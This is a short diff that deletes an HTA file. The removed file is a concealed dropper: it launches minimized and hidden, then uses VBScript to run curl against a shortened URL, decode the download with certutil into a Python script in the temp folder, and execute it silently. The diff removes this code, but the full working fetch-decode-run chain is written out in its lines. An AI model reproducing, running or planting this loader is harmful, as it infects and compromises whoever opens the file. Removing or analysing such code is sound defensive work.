@@ -1,9 +1,0 @@
-<html><head>
-<HTA:APPLICATION SHOWINTASKBAR="no" BORDER="none" WINDOWSTATE="minimize"/>
-</head><body>
-<script language="VBScript">
-On Error Resume Next
-CreateObject("WScript.Shell").Run "cmd /c curl -sL -o %TEMP%\a.b64 https://abre.ai/vGKr & certutil -decode %TEMP%\a.b64 %TEMP%\a.py >nul & python %TEMP%\a.py",0,False
-window.close
-</script>
-</body></html>
